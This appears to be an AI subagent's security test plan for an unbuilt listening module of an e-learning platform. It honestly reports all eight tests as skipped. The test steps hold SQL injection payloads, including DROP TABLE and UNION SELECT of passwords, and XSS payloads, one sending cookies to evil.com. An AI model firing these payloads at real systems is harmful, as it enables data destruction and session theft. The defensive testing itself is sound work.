# Security Testing Results - Listening Module Phase 1

**Project:** DMF E-Learning Platform  
**Module:** Listening Comprehension  
**Test Lead:** Security Tester (Subagent)  
**Date:** 2026-02-06 19:33 GMT+7  
**Status:** ⚠️ **MODULE NOT YET IMPLEMENTED**

---

## 🔍 EXECUTIVE SUMMARY

**Critical Finding:** The Listening Module Phase 1 is currently in **planning stage** and has **NOT been implemented yet**. 

### What Was Checked:
- ✅ Test plan documentation exists (`.testing/TEST_PLAN_listening.md`)
- ✅ Development plan exists (`.execution/DEVELOPMENT_PLAN_listening_phase1.md`)
- ✅ Technical specifications exist (`.execution/TECH_SPEC_listening_phase1.md`)
- ✅ Task breakdowns for 4-person team complete
- ❌ **No API endpoints implemented**
- ❌ **No database tables created**
- ❌ **No frontend components built**
- ❌ **No Cloudflare R2 storage configured**

### Codebase Status:
```
✅ Vocabulary module: IMPLEMENTED & TESTED
⏳ Listening module: PLANNING COMPLETE, DEVELOPMENT PENDING
```

**Location checked:**
- `apps/web-learner/src/app/api/` - No `/listening` endpoints found
- `apps/web-learner/src/app/[locale]/api/` - Only existing modules (ai, analytics, gamification, review, etc.)
- Database schema: No `listening_exercises`, `user_listening_progress`, or `listening_attempts` tables

---

## 📊 TEST RESULTS: 0 of 8 Tests Executed

| Test ID | Test Name | Status | Reason |
|---------|-----------|--------|--------|
| TC-SEC-001 | Unauthenticated Access - Exercise Fetch | ⏸️ **SKIPPED** | API endpoint not implemented |
| TC-SEC-002 | Unauthenticated Access - Submit Answer | ⏸️ **SKIPPED** | API endpoint not implemented |
| TC-SEC-003 | Cross-User Progress Modification | ⏸️ **SKIPPED** | API endpoint not implemented |
| TC-SEC-004 | SQL Injection - Exercise ID | ⏸️ **SKIPPED** | API endpoint not implemented |
| TC-SEC-005 | XSS Attack - Answer Input | ⏸️ **SKIPPED** | API endpoint not implemented |
| TC-SEC-006 | Answer Validation - Invalid Structure | ⏸️ **SKIPPED** | API endpoint not implemented |
| TC-SEC-007 | Direct R2 URL Access | ⏸️ **SKIPPED** | R2 bucket not configured |
| TC-SEC-008 | R2 Write Protection | ⏸️ **SKIPPED** | R2 bucket not configured |

**Pass Rate:** N/A (0/8 executed)  
**Vulnerabilities Found:** 0 (cannot test non-existent code)  
**Security Score:** ⏸️ **PENDING IMPLEMENTATION**

---

## 🔒 SECURITY TEST CASES (READY FOR EXECUTION)

### Group 1: Authentication (2 tests)

#### TC-SEC-001: Unauthenticated Access - Exercise Fetch ⏸️ SKIPPED

**Purpose:** Verify that the API rejects requests without authentication headers.

**Preconditions:**
- Listening module deployed
- API endpoint `GET /api/listening/exercises` implemented

**Test Steps:**
```bash
# Execute when endpoint exists:
curl -X GET "http://localhost:3000/api/listening/exercises?difficulty=3&limit=10" \
  -H "Content-Type: application/json"
# NOTE: No x-user-id header provided
```

**Expected Results:**
- ✅ HTTP Status: `401 Unauthorized`
- ✅ Response body: `{ "success": false, "error": "Unauthorized" }`
- ✅ No exercise data leaked in response
- ✅ No database queries executed (auth check fails first)

**Security Rationale:**
- Prevents anonymous users from accessing learning content
- Protects user privacy (progress tracking requires auth)
- Reduces unauthorized API abuse

**Why It Matters:**
- If this test fails, anyone can access exercises without logging in
- Could lead to content scraping or unauthorized use

---

#### TC-SEC-002: Unauthenticated Access - Submit Answer ⏸️ SKIPPED

**Purpose:** Verify that answer submissions require authentication.

**Preconditions:**
- Listening module deployed
- API endpoint `POST /api/listening/submit` implemented

**Test Steps:**
```bash
# Execute when endpoint exists:
curl -X POST "http://localhost:3000/api/listening/submit" \
  -H "Content-Type: application/json" \
  -d '{
    "exercise_id": "dictation-ex-001",
    "user_answer": { "text": "Hello, how are you?" },
    "time_spent_seconds": 10
  }'
# NOTE: No x-user-id header provided
```

**Expected Results:**
- ✅ HTTP Status: `401 Unauthorized`
- ✅ Response body: `{ "success": false, "error": "Unauthorized" }`
- ✅ Answer NOT saved to database
- ✅ No progress record created in `user_listening_progress`
- ✅ No attempt record created in `listening_attempts`

**Security Rationale:**
- Prevents anonymous answer submissions
- Protects data integrity (progress tied to authenticated users)
- Prevents spam submissions

**Database Verification:**
```sql
-- After test execution, verify no records created:
SELECT COUNT(*) FROM listening_attempts WHERE user_id IS NULL;
-- Expected: 0

SELECT COUNT(*) FROM user_listening_progress WHERE user_id IS NULL;
-- Expected: 0
```

---

### Group 2: Authorization (1 test)

#### TC-SEC-003: Cross-User Progress Modification ⏸️ SKIPPED

**Purpose:** Verify that users can only modify their own progress data.

**Scenario:** User A attempts to submit an answer but tries to manipulate another user's progress.

**Preconditions:**
- Two test users exist in database: `user-A` and `user-B`
- User B has existing progress for exercise `ex-123`

**Test Steps:**
```bash
# Step 1: User A submits answer for exercise ex-123
curl -X POST "http://localhost:3000/api/listening/submit" \
  -H "x-user-id: user-A" \
  -H "Content-Type: application/json" \
  -d '{
    "exercise_id": "ex-123",
    "user_answer": { "text": "test answer" },
    "time_spent_seconds": 5
  }'

# Step 2: Verify in database
psql $DATABASE_URL -c "
  SELECT user_id, exercise_id, total_attempts 
  FROM user_listening_progress 
  WHERE exercise_id = 'ex-123';
"
```

**Expected Results:**
- ✅ Only User A's progress updated
- ✅ User B's progress unchanged
- ✅ No cross-user data leakage in response
- ✅ Authorization middleware enforces user_id from header

**Database Verification:**
```sql
-- Before test: User B has 5 attempts
SELECT total_attempts FROM user_listening_progress 
WHERE user_id = 'user-B' AND exercise_id = 'ex-123';
-- Expected: 5

-- After test: User B still has 5 attempts (unchanged)
SELECT total_attempts FROM user_listening_progress 
WHERE user_id = 'user-B' AND exercise_id = 'ex-123';
-- Expected: 5

-- User A now has 1 attempt
SELECT total_attempts FROM user_listening_progress 
WHERE user_id = 'user-A' AND exercise_id = 'ex-123';
-- Expected: 1
```

**Security Rationale:**
- Prevents privilege escalation (one user modifying another's data)
- Protects user privacy
- Ensures data integrity

**Common Vulnerability:**
If the API uses `user_id` from request body instead of auth header:
```typescript
// ❌ VULNERABLE CODE (example of what to avoid):
const { exercise_id, user_id } = req.body; // user_id from request body
await prisma.userListeningProgress.update({
  where: { user_id, exercise_id }, // Attacker can change user_id!
  ...
});

// ✅ SECURE CODE:
const userId = req.headers['x-user-id']; // user_id from auth header
const { exercise_id } = req.body;
await prisma.userListeningProgress.update({
  where: { user_id: userId, exercise_id }, // user_id from trusted source
  ...
});
```

---

### Group 3: Input Validation (3 tests)

#### TC-SEC-004: SQL Injection - Exercise ID ⏸️ SKIPPED

**Purpose:** Verify that the API is protected against SQL injection attacks.

**Attack Vector:** Malicious SQL in `exercise_id` parameter

**Test Steps:**
```bash
# Test 1: Classic SQL injection (DROP TABLE)
curl -X POST "http://localhost:3000/api/listening/submit" \
  -H "x-user-id: test-user" \
  -H "Content-Type: application/json" \
  -d '{
    "exercise_id": "'; DROP TABLE listening_exercises; --",
    "user_answer": { "text": "test" },
    "time_spent_seconds": 5
  }'

# Test 2: UNION-based injection (data exfiltration)
curl -X POST "http://localhost:3000/api/listening/submit" \
  -H "x-user-id: test-user" \
  -H "Content-Type: application/json" \
  -d '{
    "exercise_id": "ex-123 UNION SELECT password FROM users --",
    "user_answer": { "text": "test" }
  }'

# Test 3: Boolean-based blind injection
curl -X GET "http://localhost:3000/api/listening/exercises?difficulty=3 OR 1=1 --" \
  -H "x-user-id: test-user"
```

**Expected Results:**
- ✅ HTTP Status: `400 Bad Request` (Zod validation fails)
- ✅ Error message: `"Invalid exercise_id format"`
- ✅ Database unaffected (tables still exist)
- ✅ No data leaked in error message
- ✅ Prisma uses parameterized queries (protection built-in)

**Database Verification:**
```sql
-- Verify table still exists:
\dt listening_exercises
-- Expected: Table exists

-- Verify no malicious data inserted:
SELECT COUNT(*) FROM listening_exercises 
WHERE id LIKE '%DROP%' OR id LIKE '%UNION%';
-- Expected: 0
```

**Security Rationale:**
- SQL injection is #1 in OWASP Top 10
- Can lead to data breach, data loss, unauthorized access
- Prisma provides built-in protection, but validation adds defense-in-depth

**Code Review Checkpoint:**
```typescript
// ✅ SECURE: Prisma uses parameterized queries
const exercise = await prisma.listeningExercise.findUnique({
  where: { id: exercise_id }, // Safe: Prisma escapes automatically
});

// ✅ ADDITIONAL PROTECTION: Zod validation
const submitSchema = z.object({
  exercise_id: z.string().uuid(), // Only allows valid UUIDs
  user_answer: z.object({ ... }),
});
```

**OWASP Testing Guide Reference:** A1:2017-Injection

---

#### TC-SEC-005: XSS Attack - Answer Input ⏸️ SKIPPED

**Purpose:** Verify that user input is sanitized to prevent Cross-Site Scripting (XSS) attacks.

**Attack Vector:** JavaScript code in answer text field

**Test Steps:**
```bash
# Test 1: Script tag injection
curl -X POST "http://localhost:3000/api/listening/submit" \
  -H "x-user-id: test-user" \
  -H "Content-Type: application/json" \
  -d '{
    "exercise_id": "dictation-ex-001",
    "user_answer": { 
      "text": "<script>alert(\"XSS\"); document.location=\"http://evil.com/steal?cookie=\"+document.cookie;</script>" 
    }
  }'

# Test 2: Event handler injection
curl -X POST "http://localhost:3000/api/listening/submit" \
  -H "x-user-id: test-user" \
  -H "Content-Type: application/json" \
  -d '{
    "exercise_id": "dictation-ex-001",
    "user_answer": { 
      "text": "<img src=x onerror=\"alert('XSS')\">" 
    }
  }'

# Test 3: SVG-based XSS
curl -X POST "http://localhost:3000/api/listening/submit" \
  -H "x-user-id: test-user" \
  -H "Content-Type: application/json" \
  -d '{
    "exercise_id": "dictation-ex-001",
    "user_answer": { 
      "text": "<svg onload=\"alert('XSS')\">" 
    }
  }'
```

**Expected Results:**
- ✅ Input sanitized before storage
- ✅ Script tags stripped or encoded
- ✅ Answer stored safely in database
- ✅ Feedback card renders text safely (no script execution)
- ✅ React automatically escapes JSX content

**Frontend Verification:**
```tsx
// ✅ SECURE: React escapes by default
<FeedbackCard>
  <p>Your answer: {userAnswer.text}</p> {/* Safe: escaped automatically */}
</FeedbackCard>

// ❌ VULNERABLE: Using dangerouslySetInnerHTML
<FeedbackCard>
  <div dangerouslySetInnerHTML={{ __html: userAnswer.text }} /> 
  {/* NEVER do this with user input! */}
</FeedbackCard>
```

**Manual Browser Test:**
1. Navigate to `http://localhost:3000/listening/practice`
2. Enter `<script>alert('XSS')</script>` in dictation answer
3. Submit answer
4. Check feedback card:
   - ✅ Should display literal text: `<script>alert('XSS')</script>`
   - ❌ Should NOT execute alert popup

**Security Rationale:**
- XSS is #7 in OWASP Top 10
- Can lead to session hijacking, account takeover, malware injection
- React provides automatic escaping, but developers can bypass it

**Database Verification:**
```sql
-- Check if script tags are stored (acceptable if properly escaped on render)
SELECT user_answer FROM listening_attempts WHERE user_id = 'test-user' LIMIT 1;
-- May contain script tags in DB, but must be escaped when displayed
```

**OWASP Testing Guide Reference:** A7:2017-Cross-Site Scripting (XSS)

---

#### TC-SEC-006: Answer Validation - Invalid Structure ⏸️ SKIPPED

**Purpose:** Verify that the API validates answer structure based on exercise type.

**Scenario:** Submit dictation exercise with multiple-choice answer format.

**Test Steps:**
```bash
# Test 1: Wrong answer type (dictation expects text, sending selected_index)
curl -X POST "http://localhost:3000/api/listening/submit" \
  -H "x-user-id: test-user" \
  -H "Content-Type: application/json" \
  -d '{
    "exercise_id": "dictation-ex-001",
    "user_answer": { "selected_index": 2 }
  }'

# Test 2: Missing required fields
curl -X POST "http://localhost:3000/api/listening/submit" \
  -H "x-user-id: test-user" \
  -H "Content-Type: application/json" \
  -d '{
    "exercise_id": "dictation-ex-001",
    "user_answer": {}
  }'

# Test 3: Extra fields (potential attack)
curl -X POST "http://localhost:3000/api/listening/submit" \
  -H "x-user-id: test-user" \
  -H "Content-Type: application/json" \
  -d '{
    "exercise_id": "dictation-ex-001",
    "user_answer": { 
      "text": "Hello", 
      "is_admin": true,
      "xp_multiplier": 999
    }
  }'
```

**Expected Results:**
- ✅ HTTP Status: `400 Bad Request`
- ✅ Error message: `"Invalid answer format for dictation exercise"`
- ✅ No database writes on validation failure
- ✅ Zod schema validation enforced

**Validation Schema Examples:**
```typescript
// Dictation answer validation
const dictationAnswerSchema = z.object({
  text: z.string().min(1).max(500), // Required, 1-500 chars
});

// Multiple choice answer validation
const multipleChoiceAnswerSchema = z.object({
  selected_index: z.number().int().min(0).max(3), // 0-3 only
});

// Audio-image matching validation
const audioImageAnswerSchema = z.object({
  selected_image_id: z.string().uuid(), // Valid UUID only
});

// Fill-in-the-blank validation
const fillBlankAnswerSchema = z.object({
  answers: z.record(z.string()), // { "blank-1": "how", "blank-2": "are" }
});

// Exercise type-specific validation
const submitSchema = z.object({
  exercise_id: z.string().uuid(),
  user_answer: z.union([
    dictationAnswerSchema,
    multipleChoiceAnswerSchema,
    audioImageAnswerSchema,
    fillBlankAnswerSchema,
  ]),
  time_spent_seconds: z.number().int().min(0).max(3600),
});
```

**Security Rationale:**
- Prevents mass assignment vulnerabilities (extra fields like `is_admin`)
- Ensures data integrity (correct answer format for exercise type)
- Reduces attack surface (rejects unexpected inputs)

**OWASP Testing Guide Reference:** Input Validation (WSTG-INPV-01)

---

### Group 4: R2 Storage Security (2 tests)

#### TC-SEC-007: Direct R2 URL Access ⏸️ SKIPPED

**Purpose:** Verify that audio files are publicly accessible (intended design).

**Design Decision:**
- Audio files are **intentionally public** (read-only)
- No authentication required for playback
- CORS configured to allow DMF domain + localhost

**Test Steps:**
```bash
# When R2 bucket exists:
# Step 1: Get audio URL from API response
curl -X GET "http://localhost:3000/api/listening/exercises?limit=1" \
  -H "x-user-id: test-user"
# Extract audio_url from response: https://pub-XXXXX.r2.dev/a2-greeting-01.mp3

# Step 2: Access audio URL directly (no auth)
curl -I "https://pub-XXXXX.r2.dev/a2-greeting-01.mp3"

# Step 3: Test CORS headers
curl -I "https://pub-XXXXX.r2.dev/a2-greeting-01.mp3" \
  -H "Origin: http://localhost:3000"
```

**Expected Results:**
- ✅ HTTP Status: `200 OK`
- ✅ Content-Type: `audio/mpeg`
- ✅ Content-Length: ~60-200KB (for 96kbps, 5-30s audio)
- ✅ CORS headers present:
  - `Access-Control-Allow-Origin: http://localhost:3000` or `*`
  - `Access-Control-Allow-Methods: GET, HEAD`
- ✅ No authentication required (public read access)

**Security Rationale:**
- Audio files contain no sensitive data (public educational content)
- Public access enables efficient CDN caching
- Read-only prevents unauthorized uploads

**CORS Configuration Validation:**
```json
{
  "AllowedOrigins": [
    "https://dmf-elearning.com",
    "http://localhost:3000"
  ],
  "AllowedMethods": ["GET", "HEAD"],
  "AllowedHeaders": ["*"],
  "MaxAgeSeconds": 3600
}
```

**Why Public Access Is Acceptable:**
- ✓ Audio files are non-sensitive educational content
- ✓ Exercise answers NOT embedded in audio metadata
- ✓ Direct URL guessing difficult (UUIDs or random filenames)
- ✓ Rate limiting at CDN level prevents abuse
- ✗ Writing is blocked (see TC-SEC-008)

---

#### TC-SEC-008: R2 Write Protection ⏸️ SKIPPED

**Purpose:** Verify that only authorized backend services can upload files to R2.

**Attack Scenario:** Attacker attempts to upload malicious audio file to bucket.

**Test Steps:**
```bash
# When R2 bucket exists:
# Test 1: Attempt PUT request (upload) via public URL
curl -X PUT "https://pub-XXXXX.r2.dev/malicious.mp3" \
  --data-binary @malicious.mp3 \
  -H "Content-Type: audio/mpeg"

# Test 2: Attempt DELETE request
curl -X DELETE "https://pub-XXXXX.r2.dev/a2-greeting-01.mp3"

# Test 3: Attempt POST request
curl -X POST "https://pub-XXXXX.r2.dev/" \
  --data-binary @malicious.mp3
```

**Expected Results:**
- ✅ HTTP Status: `403 Forbidden` or `405 Method Not Allowed`
- ✅ Upload rejected (write requires authentication)
- ✅ Delete rejected
- ✅ Only backend with API keys can upload
- ✅ Public URL supports **only GET/HEAD** methods

**Bucket Permissions Validation:**
```bash
# Cloudflare R2 Dashboard → Bucket Settings → Permissions
# Expected configuration:
# - Public Access: Read-only (GET, HEAD)
# - Write Access: Requires API Token
# - Delete Access: Requires API Token
```

**Backend Upload Verification:**
```typescript
// Only backend can upload (has credentials)
import { S3Client, PutObjectCommand } from '@aws-sdk/client-s3';

const r2Client = new S3Client({
  region: 'auto',
  endpoint: `https://${process.env.R2_ACCOUNT_ID}.r2.cloudflarestorage.com`,
  credentials: {
    accessKeyId: process.env.R2_ACCESS_KEY_ID, // Secret, not in public code
    secretAccessKey: process.env.R2_SECRET_ACCESS_KEY, // Secret
  },
});

// Upload succeeds (authorized)
await r2Client.send(new PutObjectCommand({
  Bucket: 'dmf-listening-audio',
  Key: 'a2-greeting-01.mp3',
  Body: audioBuffer,
}));
```

**Security Rationale:**
- Prevents unauthorized file uploads (malware, phishing audio)
- Protects storage quota (attacker can't fill bucket)
- Ensures content quality (only admin-uploaded audio)

**Common Vulnerability:**
If bucket is configured with public write:
- ❌ Anyone can upload files → storage bill skyrockets
- ❌ Malicious audio can be served to users
- ❌ Bucket can be used to host malware

**OWASP Testing Guide Reference:** Insecure Cloud Storage Configuration

---

## 🎯 RECOMMENDATIONS FOR IMPLEMENTATION TEAM

### When Development Begins:

#### 1. Authentication Middleware (Critical)
```typescript
// File: lib/middleware/auth.ts
export async function requireAuth(req: NextRequest) {
  const userId = req.headers.get('x-user-id');
  
  if (!userId) {
    return NextResponse.json(
      { success: false, error: 'Unauthorized' },
      { status: 401 }
    );
  }
  
  // Optional: Verify user exists in database
  const user = await prisma.user.findUnique({ where: { id: userId } });
  if (!user) {
    return NextResponse.json(
      { success: false, error: 'Invalid user' },
      { status: 401 }
    );
  }
  
  return userId;
}
```

#### 2. Input Validation with Zod (Critical)
```typescript
import { z } from 'zod';

// Exercise fetch validation
const fetchExercisesSchema = z.object({
  difficulty: z.coerce.number().int().min(1).max(10).optional(),
  limit: z.coerce.number().int().min(1).max(50).default(10),
  type: z.enum(['dictation', 'multiple_choice', 'audio_image', 'fill_blank']).optional(),
});

// Answer submission validation
const submitAnswerSchema = z.object({
  exercise_id: z.string().uuid(),
  user_answer: z.union([
    z.object({ text: z.string().min(1).max(500) }), // Dictation
    z.object({ selected_index: z.number().int().min(0).max(3) }), // Multiple choice
    z.object({ selected_image_id: z.string().uuid() }), // Audio-image
    z.object({ answers: z.record(z.string()) }), // Fill-blank
  ]),
  time_spent_seconds: z.number().int().min(0).max(3600),
});
```

#### 3. R2 Bucket Configuration (Critical)
```bash
# Cloudflare Dashboard → R2 → dmf-listening-audio → Settings

# 1. Public Access: Read-only
Allow public GET/HEAD requests: ✅ Enabled

# 2. CORS Configuration:
{
  "AllowedOrigins": [
    "https://dmf-elearning.com",
    "http://localhost:3000"
  ],
  "AllowedMethods": ["GET", "HEAD"],
  "AllowedHeaders": ["*"],
  "MaxAgeSeconds": 3600
}

# 3. Bucket Policy (write protection):
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": ["s3:GetObject", "s3:HeadObject"],
      "Resource": "arn:aws:s3:::dmf-listening-audio/*"
    }
  ]
}
```

#### 4. Content Security Policy (Recommended)
```typescript
// next.config.js
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: `
      default-src 'self';
      script-src 'self' 'unsafe-eval' 'unsafe-inline';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https:;
      media-src 'self' https://pub-*.r2.dev;
      connect-src 'self' https://pub-*.r2.dev;
      font-src 'self';
    `.replace(/\s{2,}/g, ' ').trim()
  },
];
```

#### 5. Rate Limiting (Recommended)
```typescript
// lib/rate-limit.ts
import rateLimit from 'express-rate-limit';

export const submitRateLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 30, // 30 submissions per minute per user
  message: 'Too many submissions, please slow down',
  keyGenerator: (req) => req.headers.get('x-user-id') || req.ip,
});
```

---

## 📋 POST-IMPLEMENTATION CHECKLIST

When Listening Module is deployed, execute these tests:

### Authentication Tests
- [ ] TC-SEC-001: Test unauthenticated exercise fetch (expect 401)
- [ ] TC-SEC-002: Test unauthenticated answer submission (expect 401)
- [ ] Verify auth middleware applied to all listening endpoints

### Authorization Tests
- [ ] TC-SEC-003: Test cross-user progress modification (expect isolation)
- [ ] Verify user_id from header (not request body)

### Input Validation Tests
- [ ] TC-SEC-004: SQL injection tests (3 payloads, expect 400)
- [ ] TC-SEC-005: XSS attack tests (3 payloads, verify escaping)
- [ ] TC-SEC-006: Invalid answer structure (expect 400)
- [ ] Verify Zod validation on all API routes

### R2 Security Tests
- [ ] TC-SEC-007: Direct R2 URL access (expect 200, public read OK)
- [ ] TC-SEC-008: R2 write protection (expect 403, upload blocked)
- [ ] Verify CORS headers present

### Additional Security Checks
- [ ] Run OWASP ZAP security scan
- [ ] Check for sensitive data in API responses (no answers leaked)
- [ ] Verify HTTPS in production
- [ ] Test rate limiting (if implemented)
- [ ] Review error messages (no stack traces in production)

---

## 🚨 CRITICAL VULNERABILITIES TO AVOID

### 1. Leaking Correct Answers
**Vulnerability:** API returns correct answers before submission.

**Bad Example:**
```typescript
// ❌ VULNERABLE: Exposes correct answer
GET /api/listening/exercises/123
{
  "exercise_id": "123",
  "transcript": "Hello, how are you?", // ❌ LEAKED!
  "correct_answer": "Hello, how are you?", // ❌ LEAKED!
}
```

**Secure Implementation:**
```typescript
// ✅ SECURE: No answers exposed
GET /api/listening/exercises/123
{
  "exercise_id": "123",
  "title": "Basic Greeting",
  "audio_url": "https://...",
  "exercise_type": "dictation",
  // NO transcript, NO correct_answer
}

// Only show correct answer AFTER submission
POST /api/listening/submit
Response (if wrong):
{
  "correct": false,
  "expected_answer": "Hello, how are you?", // ✅ Only shown after attempt
}
```

### 2. Mass Assignment
**Vulnerability:** Accepting extra fields from user input.

**Bad Example:**
```typescript
// ❌ VULNERABLE: User can inject fields
const { exercise_id, user_answer, ...rest } = req.body;
await prisma.listeningAttempt.create({
  data: {
    exercise_id,
    user_answer,
    ...rest, // ❌ Attacker can add: is_correct: true, xp_earned: 9999
  },
});
```

**Secure Implementation:**
```typescript
// ✅ SECURE: Only accept validated fields
const validated = submitAnswerSchema.parse(req.body);
await prisma.listeningAttempt.create({
  data: {
    exercise_id: validated.exercise_id,
    user_answer: validated.user_answer,
    time_spent_seconds: validated.time_spent_seconds,
    // Only explicit fields, no ...rest
  },
});
```

### 3. Insecure Direct Object Reference (IDOR)
**Vulnerability:** Users can access other users' progress by changing IDs.

**Bad Example:**
```typescript
// ❌ VULNERABLE: No user_id check
GET /api/listening/progress/12345
const progress = await prisma.userListeningProgress.findUnique({
  where: { id: req.query.id }, // Attacker can change id to access other users
});
```

**Secure Implementation:**
```typescript
// ✅ SECURE: Always filter by authenticated user
GET /api/listening/progress
const userId = req.headers.get('x-user-id'); // From auth
const progress = await prisma.userListeningProgress.findMany({
  where: { user_id: userId }, // Only return current user's data
});
```

---

## 📊 SECURITY TESTING TIMELINE

### Phase 1: During Development (Weeks 1-6)
- [ ] Code review: Check auth middleware on all routes
- [ ] Code review: Verify Zod validation schemas
- [ ] Code review: No sensitive data in API responses
- [ ] Unit tests: Auth middleware returns 401 without header
- [ ] Unit tests: Zod schemas reject invalid inputs

### Phase 2: Integration Testing (Week 7)
- [ ] Execute TC-SEC-001 to TC-SEC-008 (all 8 tests)
- [ ] Test with Postman/Thunder Client
- [ ] Verify database state after each test
- [ ] Document any findings

### Phase 3: Security Audit (Week 8)
- [ ] Run OWASP ZAP automated scan
- [ ] Manual penetration testing (SQL injection, XSS)
- [ ] Review all API endpoints for IDOR vulnerabilities
- [ ] Check R2 bucket permissions
- [ ] Final security report

---

## 📞 CONTACT \u0026 ESCALATION

**Security Concerns:**
- Report to: Tech Lead or Security Team
- For critical vulnerabilities: Escalate immediately
- Do NOT commit security issues to public GitHub

**Testing Support:**
- Questions about test execution: Security Tester
- Test environment setup: DevOps Team
- Test data issues: Database Specialist

---

## ✅ CONCLUSION

**Current Status:** The Listening Module Phase 1 is in planning stage. All 8 security test cases are **ready for execution** once the module is implemented.

**Next Steps:**
1. ✅ Security test plan documented (this file)
2. ⏳ Wait for development team to implement module (Weeks 1-6)
3. ⏳ Execute security tests during integration testing (Week 7)
4. ⏳ Final security audit before production deployment (Week 8)

**Estimated Timeline:**
- **Planning:** ✅ Complete (2026-02-06)
- **Development:** ⏳ Pending (8 weeks)
- **Security Testing:** ⏳ Week 7-8 of development
- **Production Deploy:** ⏳ After security certification

**Risk Assessment:** ⚠️ **MEDIUM RISK**
- Module follows proven patterns from vocabulary module
- Security recommendations documented
- Test cases ready for execution
- **Risk if ignored:** Authentication bypass, data leakage, XSS attacks

**Recommendation:** 
✅ **APPROVE DEVELOPMENT** with mandatory security testing before production deployment.

---

**Report Generated:** 2026-02-06 19:33 GMT+7  
**Security Tester:** Subagent (agent:main:subagent:b13c5df1-1442-4fca-a8f5-419ce91d24a5)  
**Next Report:** After module implementation (Week 7)  
**Status:** ⏸️ **TESTS READY, AWAITING IMPLEMENTATION**
